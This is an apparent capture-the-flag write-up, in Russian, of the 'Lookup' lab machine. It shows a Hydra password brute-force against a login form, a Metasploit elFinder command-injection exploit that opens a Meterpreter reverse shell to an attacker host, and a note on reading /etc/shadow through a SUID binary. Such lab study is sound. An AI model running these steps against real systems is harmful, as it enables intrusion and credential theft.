# Lookup

**Сложность:** Easy
**Техники:** брут логина · энумерация vhost · command injection в elFinder (Metasploit)

## Разведка
```bash
nmap -sC -sV -p- -oN scan.nmap <ip>
```
```
22/tcp open  ssh   OpenSSH 8.2p1
80/tcp open  http  Apache 2.4.41  → редирект на http://lookup.thm
```
`lookup.thm` в `/etc/hosts`.

## Энумерация и закрепление — брут входа
Сайт отдаёт `login.php`. Hydra нашла валидные учётки:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt lookup.thm \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password"
# login: admin  password: password123
# login: jose   password: password123
```
После входа приложение редиректит на новый vhost — добавляем `files.lookup.thm` в `/etc/hosts`. Там крутится **elFinder** (веб-файлменеджер) на `/elFinder/`.

## Эксплуатация — command injection в elFinder
Баг в PHP-коннекторе elFinder через обработку изображений (exiftran). Модуль Metasploit:
```
msf > use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
msf > set RHOSTS files.lookup.thm
msf > set TARGETURI /elFinder/
msf > set LHOST <attacker>
msf > run
# Meterpreter session → getuid: www-data
```
Шелл под `www-data`.

## Повышение привилегий (продолжение)
Типовой путь: энумерация SUID/capabilities — бинарник `look` (GTFOBins) читает произвольные файлы, через него читаем `/etc/shadow` или учётку пользователя, затем эскалация. *Заметки обрываются на www-data; privesc-часть дописать.*

## Выводы
- Слабые/общие пароли (`password123`) мгновенно падают под Hydra + rockyou.
- Успешный вход, открывающий новый vhost — почему важна энумерация vhost.
- Держать веб-файлменеджеры (elFinder) пропатченными — инъекция через обработку картинок это известный надёжный RCE.
